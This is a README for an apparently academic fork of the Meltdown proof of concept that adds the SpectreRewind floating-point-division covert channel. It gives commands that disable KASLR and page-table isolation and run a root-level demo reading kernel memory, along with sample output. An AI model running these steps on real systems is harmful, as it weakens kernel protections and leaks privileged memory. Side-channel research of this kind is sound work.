# Meltdown with SpectreRewind

This is a folk of [Meltdown](https://github.com/IAIK/meltdown) supporting SpectreRewind, a new contention based covert channel, which targets non-pipelined floating point division units in commodity Intel, AMD, and ARM processors. 

## Experiments 

We use the [reliability](reliability.c) demo to evaluate the performance of the SpectreRewind covert channel.

### Prerequisite

Disable KASLR by specifying nokaslr in your kernel command line. For Ubuntu systems, you can modify /etc/default/grub as follows. 
```
GRUB_CMDLINE_LINUX_DEFAULT="nopti nokaslr"
```

We have tested on skylake and coffelake machines. Newer architectures with hardware level meltdown fixes (e.g., tigerlake) may not work just as the original meltdown would not work on such platforms. 

### Build and Run

```
git clone https://github.com/IAIK/meltdown
cd meltdown
patch -p1 < ../meltdown-spr.patch
make
sudo taskset 0x3 ./reliability 0xffff888000000000
```
After a few seconds, you should get an output similar to this:

```
[+] Setting physical offset to 0xffff888000000000
Using SPR (divsd_threshold=280)
[|] Success rate: 99.39% (read 114761 values)
```

### Choosing the exception suprression method 

The default exception supression mechanism is SpectreRewind (SPR). You can change this to use Intel TSX (TSX) or singal handling (SIGNAL_HANDLE). For example, to use TSX, you can modify config.fault_handling parameter of the `reliability.c` as shown below.  

```
  config.fault_handling = TSX; // SPR | SIGNAL_HANDLER;
```
